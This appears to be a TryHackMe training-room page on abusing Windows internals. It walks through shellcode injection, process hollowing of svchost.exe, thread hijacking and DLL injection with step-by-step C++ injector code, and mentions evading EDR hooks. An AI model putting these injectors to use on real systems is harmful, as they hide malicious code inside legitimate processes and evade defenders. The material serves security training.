<!--
title: Abusing Windows internals
description: 
published: true
date: 2022-10-30T14:05:20.886Z
tags: 
editor: ckeditor
dateCreated: 2022-10-30T14:05:17.851Z
-->

<h1>Introduction</h1>
<p>Windows internals are core to how the Windows operating system functions; this provides adversaries with a lucrative target for nefarious use. Windows internals can be used to hide and execute code, evade detections, and chain with other techniques or exploits.</p>
<p>The term Windows internals can encapsulate any component found on the back-end of the Windows operating system. This can include processes, file formats, COM (<strong>C</strong>omponent&nbsp;<strong>O</strong>bject&nbsp;<strong>M</strong>odel), task scheduling, I/O System, etc. This room will focus on abusing and exploiting processes and their components, DLLs (<strong>D</strong>ynamic&nbsp;<strong>L</strong>ink&nbsp;<strong>L</strong>ibraries), and the PE (<strong>P</strong>ortable&nbsp;<strong>E</strong>xecutable) format.</p>
<figure class="image image_resized" style="width:141.24px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/56fa99f2469b86c8660a0a45ae63215f.png"></figure>
<h3>Learning Objectives</h3>
<ul>
  <li>Understand how internal components are vulnerable</li>
  <li>Learn how to abuse and exploit Windows Internals vulnerabilities</li>
  <li>Understand mitigations and detections for the techniques</li>
  <li>Apply techniques learned to a real-world adversary case study</li>
</ul>
<p>Before beginning this room, familiarize yourself with basic Windows usage and functionality. We recommend completing the&nbsp;<a href="https://tryhackme.com/room/windowsinternals">Windows Internals room</a>. Basic programming knowledge in C++ and PowerShell is also recommended but not required.</p>
<h1>Abusing Processes</h1>
<p>Applications running on your operating system can contain one or more processes. Processes maintain and represent a program that’s being executed.&nbsp;</p>
<p>Processes have a lot of other sub-components and directly interact with memory or virtual memory, making them a perfect candidate to target. The table below describes each critical component of processes and their purpose.</p>
<figure class="table" style="width:1164px;">
  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
    <tbody>
      <tr>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Process Component</strong></td>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Purpose</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Private Virtual Address Space<br>&nbsp;</td>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Virtual memory addresses the process is allocated.<br>&nbsp;</td>
      </tr>
      <tr>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Executable Program<br>&nbsp;</td>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Defines code and data stored in the virtual address space<br>&nbsp;</td>
      </tr>
      <tr>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Open Handles<br>&nbsp;</td>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Defines handles to system resources accessible to the process<br>&nbsp;</td>
      </tr>
      <tr>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Security Context<br>&nbsp;</td>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">The access token defines the user, security groups, privileges, and other security information.<br>&nbsp;</td>
      </tr>
      <tr>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Process ID&nbsp;<br>&nbsp;</td>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Unique numerical identifier of the process<br>&nbsp;</td>
      </tr>
      <tr>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Threads<br>&nbsp;</td>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Section of a process scheduled for execution<br>&nbsp;</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>For more information about processes, check out the&nbsp;<a href="https://tryhackme.com/room/windowsinternals">Windows Internals room</a>.</p>
<p>Process injection is commonly used as an overarching term to describe injecting malicious code into a process through legitimate functionality or components. We will focus on four different types of process injection in this room, outlined below.</p>
<figure class="table" style="width:1164px;">
  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
    <tbody>
      <tr>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Injection Type</strong></td>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Function</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><a href="https://attack.mitre.org/techniques/T1055/012/">Process Hollowing</a><br>&nbsp;</td>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Inject code into a suspended and “hollowed” target process<br>&nbsp;</td>
      </tr>
      <tr>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><a href="https://attack.mitre.org/techniques/T1055/003/">Thread Execution Hijacking</a><br>&nbsp;</td>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Inject code into a suspended target thread<br>&nbsp;</td>
      </tr>
      <tr>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><a href="https://attack.mitre.org/techniques/T1055/001/">Dynamic-link Library Injection</a><br>&nbsp;</td>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Inject a DLL into process memory<br>&nbsp;</td>
      </tr>
      <tr>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><a href="https://attack.mitre.org/techniques/T1055/002/">Portable Executable Injection</a><br>&nbsp;</td>
        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Self-inject a PE image pointing to a malicious function into a target process<br>&nbsp;</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>There are many other forms of process injection outlined by <a href="https://attack.mitre.org/techniques/T1055/">MITRE T1055</a>.</p>
<p>At its most basic level, process injection takes the form of shellcode injection.</p>
<p>At a high level, shellcode injection can be broken up into four steps:</p>
<ol>
  <li>Open a target process with all access rights.</li>
  <li>Allocate target process memory for the shellcode.</li>
  <li>Write shellcode to allocated memory in the target process.</li>
  <li>Execute the shellcode using a remote thread.</li>
</ol>
<p>The steps can also be broken down graphically to depict how Windows API calls interact with process memory.</p>
<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ba04c5ef220c10b3e174bd1ca77959c6.png"></figure>
<p>We will break down a basic shellcode injector to identify each of the steps and explain in more depth below.</p>
<p>At step one of shellcode injection, we need to open a target process using special parameters. <code>OpenProcess</code> is used to open the target process supplied via the command-line.</p>
<pre><code class="language-cpp">processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);
</code></pre>
<p>At step two, we must allocate memory to the byte size of the shellcode. Memory allocation is handled using <code>VirtualAllocEx</code>. Within the call, the <code>dwSize</code> parameter is defined using the <code>sizeof</code> function to get the bytes of shellcode to allocate.</p>
<pre><code class="language-cpp">remoteBuffer = VirtualAllocEx(
	processHandle, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
</code></pre>
<p>At step three, we can now use the allocated memory region to write our shellcode. <code>WriteProcessMemory</code> is commonly used to write to memory regions.</p>
<pre><code class="language-cpp">WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
</code></pre>
<p>At step four, we now have control of the process, and our malicious code is now written to memory. To execute the shellcode residing in memory, we can use <code>CreateRemoteThread</code>; threads control the execution of processes.</p>
<pre><code class="language-cpp">remoteThread = CreateRemoteThread(
	processHandle, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
);
</code></pre>
<p>We can compile these steps together to create a basic process injector. Use the C++ injector provided and experiment with process injection.</p>
<p>Shellcode injection is the most basic form of process injection; in the next task, we will look at how we can modify and adapt these steps for process hollowing.</p>
<h1>Expanding Process Abuse</h1>
<p>In the previous task, we discussed how we can use shellcode injection to inject malicious code into a legitimate process. In this task we will cover process hollowing. Similar to shellcode injection, this technique offers the ability to inject an entire malicious file into a process. This is accomplished by “hollowing” or un-mapping the process and injecting specific PE (<strong>P</strong>ortable <strong>E</strong>xecutable) data and sections into the process.</p>
<p>At a high-level process hollowing can be broken up into six steps:</p>
<ol>
  <li>Create a target process in a suspended state.</li>
  <li>Open a malicious image.</li>
  <li>Un-map legitimate code from process memory.</li>
  <li>Allocate memory locations for malicious code and write each section into the address space.</li>
  <li>Set an entry point for the malicious code.</li>
  <li>Take the target process out of a suspended state.</li>
</ol>
<p>The steps can also be broken down graphically to depict how Windows API calls interact with process memory.</p>
<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3c36b4470fb04e3bfdbbef0674b79ec2.png"></figure>
<p>We will break down a basic process hollowing injector to identify each of the steps and explain in more depth below.</p>
<p>At step one of process hollowing, we must create a target process in a suspended state using <code>CreateProcessA</code>. To obtain the required parameters for the API call we can use the structures <code>STARTUPINFOA</code> and <code>PROCESS_INFORMATION</code>.</p>
<pre><code class="language-cpp">LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
CONTEXT c; // Context structure pointer

if (CreateProcessA(
	(LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", // Name of module to execute
	NULL,
	NULL,
	NULL,
	TRUE, // Handles are inherited from the calling process
	CREATE_SUSPENDED, // New process is suspended
	NULL,
	NULL,
	target_si, // pointer to startup info
	target_pi) == 0) { // pointer to process information
	cout &lt;&lt; "[!] Failed to create Target process. Last Error: " &lt;&lt; GetLastError();
	return 1;
</code></pre>
<p>In step two, we need to open a malicious image to inject. This process is split into three steps, starting by using <code>CreateFileA</code> to obtain a handle for the malicious image.</p>
<pre><code class="language-cpp">HANDLE hMaliciousCode = CreateFileA(
	(LPCSTR)"C:\\\\Users\\\\tryhackme\\\\malware.exe", // Name of image to obtain
	GENERIC_READ, // Read-only access
	FILE_SHARE_READ, // Read-only share mode
	NULL,
	OPEN_EXISTING, // Instructed to open a file or device if it exists
	NULL,
	NULL
);
</code></pre>
<p>Once a handle for the malicious image is obtained, memory must be allocated to the local process using <code>VirtualAlloc</code>. <code>GetFileSize</code> is also used to retrieve the size of the malicious image for <code>dwSize</code>.</p>
<pre><code class="language-cpp">DWORD maliciousFileSize = GetFileSize(
	hMaliciousCode, // Handle of malicious image
	0 // Returns no error
);

PVOID pMaliciousImage = VirtualAlloc(
	NULL,
	maliciousFileSize, // File size of malicious image
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x04 // Enables read/write access (PAGE_READWRITE)
);
</code></pre>
<p>Now that memory is allocated to the local process, it must be written. Using the information obtained from previous steps, we can use <code>ReadFile</code> to write to local process memory.</p>
<pre><code class="language-cpp">DWORD numberOfBytesRead; // Stores number of bytes read

if (!ReadFile(
	hMaliciousCode, // Handle of malicious image
	pMaliciousImage, // Allocated region of memory
	maliciousFileSize, // File size of malicious image
	&amp;numberOfBytesRead, // Number of bytes read
	NULL
	)) {
	cout &lt;&lt; "[!] Unable to read Malicious file into memory. Error: " &lt;&lt;GetLastError()&lt;&lt; endl;
	TerminateProcess(target_pi-&gt;hProcess, 0);
	return 1;
}

CloseHandle(hMaliciousCode);
</code></pre>
<p>At step three, the process must be “hollowed” by un-mapping memory. Before un-mapping can occur, we must identify the parameters of the API call. We need to identify the location of the process in memory and the entry point. The CPU registers&nbsp;<code>EAX</code>&nbsp;(entry point), and&nbsp;<code>EBX</code>&nbsp;(PEB location) contain the information we need to obtain; these can be found by using&nbsp;<code>GetThreadContext</code>. Once both registers are found,&nbsp;<code>ReadProcessMemory</code>&nbsp;is used to obtain the base address from the <code>EBX</code> with an offset (<code>0x8</code>), obtained from examining the PEB.</p>
<pre><code class="language-cpp">c.ContextFlags = CONTEXT_INTEGER; // Only stores CPU registers in the pointer
GetThreadContext(
	target_pi-&gt;hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
	&amp;c // Pointer to store retrieved context
); // Obtains the current thread context

PVOID pTargetImageBaseAddress; 
ReadProcessMemory(
	target_pi-&gt;hProcess, // Handle for the process obtained from the PROCESS_INFORMATION structure
	(PVOID)(c.Ebx + 8), // Pointer to the base address
	&amp;pTargetImageBaseAddress, // Store target base address 
	sizeof(PVOID), // Bytes to read 
	0 // Number of bytes out
);
</code></pre>
<p>After the base address is stored, we can begin un-mapping memory. We can use <code>ZwUnmapViewOfSection</code> imported from <i>ntdll.dll</i> to free memory from the target process.</p>
<pre><code class="language-cpp">HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); // Obtains the handle for ntdll
pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
	hNtdllBase, // Handle of ntdll
	"ZwUnmapViewOfSection" // API call to obtain
); // Obtains ZwUnmapViewOfSection from ntdll

DWORD dwResult = pZwUnmapViewOfSection(
	target_pi-&gt;hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress // Base address of the process
);
</code></pre>
<p>At step four, we must begin by allocating memory in the hollowed process. We can use <code>VirtualAlloc</code> similar to <i>step two</i> to allocate memory. This time we need to obtain the size of the image found in file headers. <code>e_lfanew</code> can identify the number of bytes from the&nbsp;DOS header&nbsp;to the&nbsp;PE header. Once at the PE header, we can obtain the <code>SizeOfImage</code> from the&nbsp;Optional header.</p>
<pre><code class="language-cpp">PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; // Obtains the DOS header from the malicious image
PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader-&gt;e_lfanew); // Obtains the NT header from e_lfanew

DWORD sizeOfMaliciousImage = pNTHeaders-&gt;OptionalHeader.SizeOfImage; // Obtains the size of the optional header from the NT header structure

PVOID pHollowAddress = VirtualAllocEx(
	target_pi-&gt;hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress, // Base address of the process
	sizeOfMaliciousImage, // Byte size obtained from optional header
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x40 // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)
);
</code></pre>
<p>Once the memory is allocated, we can write the malicious file to memory. Because we are writing a file, we must first write the PE headers then the PE sections. To write PE headers, we can use&nbsp;<code>WriteProcessMemory</code>&nbsp;and the size of headers to determine where to stop.</p>
<pre><code class="language-cpp">if (!WriteProcessMemory(
	target_pi-&gt;hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress, // Base address of the process
	pMaliciousImage, // Local memory where the malicious file resides
	pNTHeaders-&gt;OptionalHeader.SizeOfHeaders, // Byte size of PE headers 
	NULL
)) {
	cout&lt;&lt; "[!] Writting Headers failed. Error: " &lt;&lt; GetLastError() &lt;&lt; endl;
}
</code></pre>
<p>Now we need to write each section. To find the number of sections, we can use&nbsp; <code>NumberOfSections</code> from the NT headers. We can loop through <code>e_lfanew</code> and the size of the current header to write each section.</p>
<pre><code class="language-cpp">for (int i = 0; i &lt; pNTHeaders-&gt;FileHeader.NumberOfSections; i++) { // Loop based on number of sections in PE data
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the current PE section header

	WriteProcessMemory(
		target_pi-&gt;hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
		(PVOID)((LPBYTE)pHollowAddress + pSectionHeader-&gt;VirtualAddress), // Base address of current section 
		(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader-&gt;PointerToRawData), // Pointer for content of current section
		pSectionHeader-&gt;SizeOfRawData, // Byte size of current section
		NULL
	);
}
</code></pre>
<p>It is also possible to use relocation tables to write the file to target memory. This will be discussed in more depth in task 6.</p>
<p>At step five, we can use&nbsp;<code>SetThreadContext</code>&nbsp;to change <code>EAX</code> to point to the entry point.</p>
<pre><code class="language-cpp">c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders-&gt;OptionalHeader.AddressOfEntryPoint); // Set the context structure pointer to the entry point from the PE optional header

SetThreadContext(
	target_pi-&gt;hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
	&amp;c // Pointer to the stored context structure
);
</code></pre>
<p>At step six, we need to take the process out of a suspended state using&nbsp;<code>ResumeThread</code>.</p>
<pre><code class="language-cpp">ResumeThread(
	target_pi-&gt;hThread // Handle to the thread obtained from the PROCESS_INFORMATION structure
);
</code></pre>
<p>We can compile these steps together to create a process hollowing injector. Use the C++ injector provided and experiment with process hollowing.</p>
<h1>Abusing Process Components</h1>
<p>At a high-level thread (execution) hijacking can be broken up into eleven steps:</p>
<ol>
  <li>Locate and open a target process to control.</li>
  <li>Allocate memory region for malicious code.</li>
  <li>Write malicious code to allocated memory.</li>
  <li>Identify the thread ID of the target thread to hijack.</li>
  <li>Open the target thread.</li>
  <li>Suspend the target thread.</li>
  <li>Obtain the thread context.</li>
  <li>Update the instruction pointer to the malicious code.</li>
  <li>Rewrite the target thread context.</li>
  <li>Resume the hijacked thread.</li>
</ol>
<p>We will break down a basic thread hijacking script to identify each of the steps and explain in more depth below.</p>
<p>The first three steps outlined in this technique following the same common steps as normal process injection. These will not be explained, instead, you can find the documented source code below.</p>
<pre><code class="language-cpp">HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Requests all possible access rights
	FALSE, // Child processes do not inheret parent process handle
	processId // Stored process ID
);
PVOIF remoteBuffer = VirtualAllocEx(
	hProcess, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
</code></pre>
<p>Once the initial steps are out of the way and our shellcode is written to memory we can move to step four. At step four, we need to begin the process of hijacking the process thread by identifying the thread ID. To identify the thread ID we need to use a trio of Windows API calls: <code>CreateToolhelp32Snapshot()</code>, <code>Thread32First()</code>, and <code>Thread32Next()</code>. These API calls will collectively loop through a snapshot of a process and extend capabilities to enumerate process information.</p>
<pre><code class="language-cpp">THREADENTRY32 threadEntry;

HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
	TH32CS_SNAPTHREAD, // Include all processes residing on the system
	0 // Indicates the current process
);
Thread32First( // Obtains the first thread in the snapshot
	hSnapshot, // Handle of the snapshot
	&amp;threadEntry // Pointer to the THREADENTRY32 structure
);

while (Thread32Next( // Obtains the next thread in the snapshot
	snapshot, // Handle of the snapshot
	&amp;threadEntry // Pointer to the THREADENTRY32 structure
)) {
</code></pre>
<p>At step five, we have gathered all the required information in the structure pointer and can open the target thread. To open the thread we will use <code>OpenThread</code> with the <code>THREADENTRY32</code> structure pointer.</p>
<pre><code class="language-cpp">if (threadEntry.th32OwnerProcessID == processID) // Verifies both parent process ID's match
		{
			HANDLE hThread = OpenThread(
				THREAD_ALL_ACCESS, // Requests all possible access rights
				FALSE, // Child threads do not inheret parent thread handle
				threadEntry.th32ThreadID // Reads the thread ID from the THREADENTRY32 structure pointer
			);
			break;
		}
</code></pre>
<p>At step six, we must suspend the opened target thread. To suspend the thread we can use <code>SuspendThread</code>.</p>
<pre><code class="language-cpp">SuspendThread(hThread);
</code></pre>
<p>At step seven, we need to obtain the thread context to use in the upcoming API calls. This can be done using <code>GetThreadContext</code> to store a pointer.</p>
<pre><code class="language-cpp">CONTEXT context;
GetThreadContext(
	hThread, // Handle for the thread 
	&amp;context // Pointer to store the context structure
);
</code></pre>
<p>At step eight, we need to overwrite RIP (Instruction Pointer Register) to point to our malicious region of memory. If you are not already familiar with CPU registers, RIP is an x64 register that will determine the next code instruction; in a nutshell, it controls the flow of an application in memory. To overwrite the register we can update the thread context for RIP.</p>
<pre><code class="language-cpp">context.Rip = (DWORD_PTR)remoteBuffer; // Points RIP to our malicious buffer allocation
</code></pre>
<p>At step nine, the context is updated and needs to be updated to the current thread context. This can be easily done using <code>SetThreadContext</code> and the pointer for the context.</p>
<pre><code class="language-cpp">SetThreadContext(
	hThread, // Handle for the thread 
	&amp;context // Pointer to the context structure
);
</code></pre>
<p>At the final step, we can now take the target thread out of a suspended state. To accomplish this we can use <code>ResumeThread</code>.</p>
<pre><code class="language-cpp">ResumeThread(
	hThread // Handle for the thread
);
</code></pre>
<p>We can compile these steps together to create a process injector via thread hijacking. Use the C++ injector provided and experiment with thread hijacking.</p>
<h1>Abusing DLLs</h1>
<p>At a high-level DLL injection can be broken up into six steps:</p>
<ol>
  <li>Locate a target process to inject.</li>
  <li>Open the target process.</li>
  <li>Allocate memory region for malicious DLL.</li>
  <li>Write the malicious DLL to allocated memory.</li>
  <li>Load and execute the malicious DLL.</li>
</ol>
<p>We will break down a basic DLL injector to identify each of the steps and explain in more depth below.</p>
<p>At step one of DLL injection, we must locate a target thread. A thread can be located from a process using a trio of Windows API calls: <code>CreateToolhelp32Snapshot()</code>, <code>Process32First()</code>, and <code>Process32Next()</code>.</p>
<pre><code class="language-cpp">DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
			TH32CS_SNAPPROCESS, // Include all processes residing on the system
			0 // Indicates the current process
		);
    if (hSnapshot) {
        PROCESSENTRY32 entry; // Adds a pointer to the PROCESSENTRY32 structure
        entry.dwSize = sizeof(PROCESSENTRY32); // Obtains the byte size of the structure
        if (Process32First( // Obtains the first process in the snapshot
					hSnapshot, // Handle of the snapshot
					&amp;entry // Pointer to the PROCESSENTRY32 structure
				)) {
            do {
                if (!strcmp( // Compares two strings to determine if the process name matches
									entry.szExeFile, // Executable file name of the current process from PROCESSENTRY32
									processName // Supplied process name
								)) { 
                    return entry.th32ProcessID; // Process ID of matched process
                }
            } while (Process32Next( // Obtains the next process in the snapshot
							hSnapshot, // Handle of the snapshot
							&amp;entry
						)); // Pointer to the PROCESSENTRY32 structure
        }
    }

DWORD processId = getProcessId(processName); // Stores the enumerated process ID
</code></pre>
<p>At step two, after the PID has been enumerated, we need to open the process. This can be accomplished from a variety of Windows API calls: <code>GetModuleHandle</code>, <code>GetProcAddress</code>, or <code>OpenProcess</code>.</p>
<pre><code class="language-cpp">HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Requests all possible access rights
	FALSE, // Child processes do not inheret parent process handle
	processId // Stored process ID
);
</code></pre>
<p>At step three, memory must be allocated for the provided malicious DLL to reside. As with most injectors, this can be accomplished using <code>VirtualAllocEx</code>.</p>
<pre><code class="language-cpp">LPVOID dllAllocatedMemory = VirtualAllocEx(
	hProcess, // Handle for the target process
	NULL, 
	strlen(dllLibFullPath), // Size of the DLL path
	MEM_RESERVE | MEM_COMMIT, // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
</code></pre>
<p>At step four, we need to write the malicious DLL to the allocated memory location. We can use <code>WriteProcessMemory</code> to write to the allocated region.</p>
<pre><code class="language-cpp">WriteProcessMemory(
	hProcess, // Handle for the target process
	dllAllocatedMemory, // Allocated memory region
	dllLibFullPath, // Path to the malicious DLL
	strlen(dllLibFullPath) + 1, // Byte size of the malicious DLL
	NULL
);
</code></pre>
<p>At step five, our malicious DLL is written to memory and all we need to do is load and execute it. To load the DLL we need to use <code>LoadLibrary</code>; imported from <code>kernel32</code>. Once loaded,&nbsp;<code>CreateRemoteThread</code> can be used to execute memory using <code>LoadLibrary</code> as the starting function.</p>
<pre><code class="language-cpp">
LPVOID loadLibrary = (LPVOID) GetProcAddress(
	GetModuleHandle("kernel32.dll"), // Handle of the module containing the call
	"LoadLibraryA" // API call to import
);
HANDLE remoteThreadHandler = CreateRemoteThread(
	hProcess, // Handle for the target process
	NULL, 
	0, // Default size from the execuatable of the stack
	(LPTHREAD_START_ROUTINE) loadLibrary, pointer to the starting function
	dllAllocatedMemory, // pointer to the allocated memory region
	0, // Runs immediately after creation
	NULL
);
</code></pre>
<p>We can compile these steps together to create a DLL injector. Use the C++ injector provided and experiment with DLL injection.</p>
<h1>Memory Execution Alternatives</h1>
<p>Depending on the environment you are placed in, you may need to alter the way that you execute your shellcode. This could occur when there are hooks on an API call and you cannot evade or unhook them, an EDR is monitoring threads, etc.</p>
<p>Up to this point, we have primarily looked at methods of allocating and writing data to and from local/remote processes. Execution is also a vital step in any injection technique; although not as important when attempting to minimize memory artifacts and IOCs (<strong>I</strong>ndicators <strong>o</strong>f <strong>C</strong>ompromise). Unlike allocating and writing data, execution has many options to choose from.</p>
<p>Throughout this room, we have observed execution primarily through <code>CreateThread</code> and its counterpart, <code>CreateRemoteThread</code>.</p>
<p>In this task we will cover three other execution methods that can be used depending on the circumstances of your environment.</p>
<p>Invoking Function Pointers</p>
<p>The void function pointer is an oddly novel method of memory block execution that relies solely on typecasting.</p>
<p>This technique can only be executed with locally allocated memory but does not rely on any API calls or other system functionality.</p>
<p>The one-liner below is the most common form of the void function pointer, but we can break it down further to explain its components.</p>
<p>Function Pointer</p>
<pre><code class="language-plaintext">((void(*)())addressPointer)();</code></pre>
<p>This one-liner can be hard to comprehend or explain since it is so dense, let's walk through it as it processes the pointer.</p>
<ol>
  <li>Create a function pointer <code>(void(*)()</code>, outlined in red</li>
  <li>Cast the allocated memory pointer or shellcode array into the function pointer <code>(&lt;function pointer&gt;)addressPointer)</code>, outlined in yellow</li>
  <li>Invoke the function pointer to execute the shellcode <code>();</code>, outlined in green</li>
</ol>
<p>This technique has a very specific use case but can be very evasive and helpful when needed.</p>
<p>Asynchronous Procedure Calls</p>
<p>From the <a href="https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">Microsoft documentation</a> on Asynchronous Procedure Calls, “An asynchronous procedure call (APC) is a function that executes asynchronously in the context of a particular thread.”</p>
